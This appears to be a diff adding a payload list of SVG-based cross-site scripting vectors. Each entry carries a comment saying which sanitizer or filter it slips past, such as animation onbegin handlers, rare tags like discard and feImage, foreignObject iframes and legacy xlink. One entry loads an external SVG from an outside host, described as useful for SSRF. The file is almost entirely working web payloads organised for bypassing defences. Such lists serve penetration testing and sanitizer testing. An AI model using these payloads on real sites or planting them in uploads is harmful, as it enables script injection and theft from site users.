@@ -1,0 +1,50 @@
+<!-- image onerror - most universal, works wherever SVG is rendered as markup -->
+<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(1)"/></svg>
+
+<!-- onload on svg root - useful when image/script tags are blocked but root attributes are not -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+
+<!-- script tag - straightforward, blocked by most sanitizers but works on direct SVG file uploads -->
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+
+<!-- animate onbegin - bypasses filters that block onload/onerror but miss animation event handlers -->
+<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x"/></svg>
+
+<!-- set onbegin - lesser known alternative to animate, useful when animate is explicitly blocked -->
+<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)" attributeName="x"/></svg>
+
+<!-- animateMotion onbegin - less common variant of animate, lower filter coverage -->
+<svg xmlns="http://www.w3.org/2000/svg"><animateMotion onbegin="alert(1)"><mpath/></animateMotion></svg>
+
+<!-- discard onbegin - rare tag, often missed by sanitizers -->
+<svg xmlns="http://www.w3.org/2000/svg"><discard onbegin="alert(1)"/></svg>
+
+<!-- geometric shapes onload - useful when onload is only blocked on svg/script/image but not on shape elements -->
+<svg xmlns="http://www.w3.org/2000/svg"><circle onload="alert(1)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><rect onload="alert(1)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><ellipse onload="alert(1)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><path onload="alert(1)"/></svg>
+
+<!-- text/tspan onload - targets sanitizers that allowlist text tags but forget their event handlers -->
+<svg xmlns="http://www.w3.org/2000/svg"><text onload="alert(1)">x</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><text><tspan onload="alert(1)">x</tspan></text></svg>
+
+<!-- feImage onerror - filter element, rarely flagged as dangerous by sanitizers focused on top-level tags -->
+<svg xmlns="http://www.w3.org/2000/svg"><filter><feImage href="x" onerror="alert(1)"/></filter></svg>
+
+<!-- marker onload - structural element, low sanitizer coverage -->
+<svg xmlns="http://www.w3.org/2000/svg"><marker onload="alert(1)"><path d="M0,0"/></marker></svg>
+
+<!-- a href javascript - requires user interaction (click), useful for stored XSS in SVG viewed directly -->
+<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>click</text></a></svg>
+
+<!-- use href - loads external SVG resource, useful for SSRF or when script execution is blocked but external requests are not -->
+<svg xmlns="http://www.w3.org/2000/svg"><use href="//howitzer.ezxss.com/evil.svg#x"/></svg>
+
+<!-- foreignObject iframe - embeds HTML in SVG, bypasses SVG-specific sanitizers that don't handle HTML context switching -->
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+
+<!-- LEGACY - targets older parsers/browsers -->
+
+<!-- xlink:href - targets older parsers or XML validators using the deprecated xlink namespace -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="x" onerror="alert(1)"/></svg>
